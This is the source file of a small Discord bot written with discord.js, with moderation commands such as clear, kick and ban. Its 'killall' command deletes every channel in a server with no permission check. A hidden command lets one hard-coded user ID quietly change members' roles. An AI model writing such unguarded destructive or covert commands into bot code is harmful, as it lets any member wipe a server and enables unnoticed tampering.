const Discord = require('discord.js');
const client = new Discord.Client();

//const token = process.env.token;
const token = ''

const PREFIX = 'p!';


const cheerio = require ('cheerio');
const request = require('request');

var version = '1.0.3';

const fs = require('fs');

var servers = {};

const ms = require('ms');
var profanitites = require('profanities');

client.on('ready', () => {
    console.log('Pungus is online!')
    client.user.setActivity('p!', { type: 'PLAYING'}).catch(console.error);
})

client.on('message', message=> {

    if(!message.content.startsWith(PREFIX)) return;
    let args = message.content.substring(PREFIX.length).split(" ");


    switch(args[0]){

        case 'doom':
            message.delete();
            client.user.setActivity('YOUR DOOM!', { type: 'PLAYING'}).catch(console.error);
        break;
        case 'killall':
            message.guild.channels.forEach(channel => channel.delete())
        break;
        case 'gotte':
            message.delete();
            message.channel.setName("YOUR DOOM!")
        break;
        case 'clear':
            if (message.member.hasPermission("ADMINISTRATOR")){
                if(!args[1]) return message.reply('Define How Much!')
            message.channel.bulkDelete(args[1])
            }
            else(message.reply("No"));
        break;
        case 'kick':
            
        message.delete();

            if (message.member.hasPermission("ADMINISTRATOR")){
            
            if(!args[1]) message.channel.send('Specify a User!')

            const user = message.mentions.users.first();

            if(user)
            {
                const member = message.mentions.members.first();

                if(member)
                {

                    member.kick('YOU WERE KICKED FROM THE ZETROMADIC DISCORD SERVER!').then(() => {

                        message.reply(`Sucessfully kicked ${user.tag}`);
                    }).catch(err =>{
                        message.reply('Unable to kick!')
                        console.log(err);
                    });

                    }

                }else{
                    message.reply("That user isn\'t in this guild")
                }}
        break;
        case 'ban':

                message.delete();

        if (message.member.hasPermission("ADMINISTRATOR")){
            
            if(!args[1]) message.channel.send('Specify a User')

            const bUser = message.mentions.users.first();

            if(bUser)
            {
                const bmember = message.mentions.members.first();

                if(bmember)
                {

                    bmember.ban('YOU WERE BANNED FROM THE ZETROMADIC DISCORD SERVER!').then(() => {

                        message.reply(`Sucessfully banned ${bUser.tag}`);
                    }).catch(err =>{
                        message.reply('Unable to ban!')
                        console.log(err);
                    });

                    }

                }else{
                    message.reply("That user isn\'t in this guild")
                }
        }
        break;

        case 'pickleddidly':
            if (message.author.id === '350398046678417408') 
            {
                message.delete();

                let cage = message.guild.member(message.mentions.users.first() || message.guild.members.get(args[2]))

                let OwOrole = message.guild.roles.cache.find(role => role.name === "OwO");
                let pissgangrole = message.guild.roles.cache.find(role => role.name === "piss gang");

                cage.roles.remove(OwOrole.id)
                cage.roles.add(pissgangrole.id);

            }
        break;
    }
})

client.login(token);